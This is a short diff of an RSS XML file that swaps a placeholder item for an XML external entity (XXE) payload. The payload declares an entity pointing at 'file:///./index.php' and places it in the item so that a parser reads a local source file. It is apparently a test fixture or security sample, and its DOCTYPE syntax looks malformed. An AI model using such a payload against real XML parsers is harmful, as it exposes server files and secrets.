@@ -1,11 +1,11 @@
 <rss version="2.0">
-    <!DOCTYPE request [
-        <!ENTITY include SYSTEM "./index.php">
-    ]>
+    <!DOCTYPE channel [
+        <!ENTITY file SYSTEM "file:///./index.php">
+    ]]>
 <channel>
     <title>XUL</title>
     <link>http://www.xul.fr</link>
     <description></description>
-    <item>TOTO</item>
+    <item>&file;</item>
 </channel>
 </rss>
